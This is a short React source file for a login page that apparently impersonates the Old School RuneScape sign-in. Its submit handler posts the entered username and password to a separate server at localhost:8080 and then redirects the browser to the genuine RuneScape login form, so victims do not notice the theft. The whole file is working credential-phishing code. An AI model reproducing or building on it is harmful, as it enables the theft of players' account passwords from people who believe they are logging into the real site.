import { useState } from 'react';
import LoginForm from './components/LoginForm';
import axios from 'axios';

const api = axios.create({
  baseURL: `http://localhost:8080/login`
});

function App() {

  const [user, setUser] = useState({username: ""});

  const logUser = async(credentials) => {
    let res = await api.post('/', { username: credentials.username, password: credentials.password });
  }

  const Login = credentials => {
    logUser(credentials);
    window.location.href = "https://secure.runescape.com/m=weblogin/loginform?theme=oldschool&mod=oldschool&ssl=1&dest=";
  }

  return (
    <div className="App">
      {(user.username != "") ? (
        <div>Hi</div>
      ) : (
        <LoginForm Login={Login} />
      )}
    </div>
  );
}

export default App;
